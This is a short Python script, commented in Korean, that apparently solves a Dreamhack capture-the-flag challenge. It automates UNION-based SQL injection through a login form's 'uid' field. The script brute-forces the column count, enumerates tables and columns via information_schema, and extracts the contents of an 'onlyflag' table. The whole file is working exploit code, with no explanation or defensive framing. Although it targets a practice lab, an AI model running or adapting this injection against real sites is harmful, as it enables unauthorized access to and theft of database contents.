import requests
from bs4 import BeautifulSoup

url="http://host1.dreamhack.games:18143/"


# 칼럼 갯수 구하기
print("find column_count"+'-'*30)
column_count=1
count='1'
while True:
    query=f'\'union select {count} #'
    print(query)
    param= {
    'uid':query,
    'upw':'apple'
    }
    res=requests.post(url,param)
    if res.status_code==200:
        break
    else:
        column_count+=1
        count+=f",{column_count}"

# 테이블명구하기
print("\nfind table_name"+'-'*30)
payload='table_name'
for i in range(2,column_count+1):
    payload+=f", {i}"
table_name="information_schema.tables"
query=f'\'union select {payload} from {table_name} #'
param= {
    'uid':query,
    'upw':'apple'
    }
res= requests.post(url, param)
html_content = res.content
soup=BeautifulSoup(html_content, 'html.parser')
rows = soup.find_all('th', scope='row')
tables=[row.get_text(strip=True) for row in rows]
print(tables)

#칼럼명 구하기
print("\nfind column_name"+'-'*30)
payload='\ncolumn_name'
for i in range(2,column_count+1):
    payload+=f", {i}"
table_name="information_schema.columns"
query=f'\'union select {payload} from {table_name} where table_name = \'onlyflag\' #'
param= {
    'uid':query,
    'upw':'apple'
    }
res= requests.post(url, param)
html_content = res.content
soup=BeautifulSoup(html_content, 'html.parser')
rows = soup.find_all('th', scope='row')

# 알아낸 칼럼들 
columns=[row.get_text(strip=True) for row in rows]
idx=1
for value in columns:
    print(idx, value)
    idx+=1
result=""

#flag찾기
print("\n\n\nflag:"+'-'*30)
for value in columns:
    payload=value
    for i in range(2,column_count+1):
        payload+=f", {i}"
    table_name="onlyflag"
    query=f'\'union select {payload} from {table_name} #'
    param= {
        'uid':query,
        'upw':'apple'
        }
    res= requests.post(url, param)
    html_content = res.content
    soup=BeautifulSoup(html_content, 'html.parser')
    rows = soup.find_all('th', scope='row')
    colum=[row.get_text(strip=True) for row in rows]
    for col in colum:
        result+=col
print(result)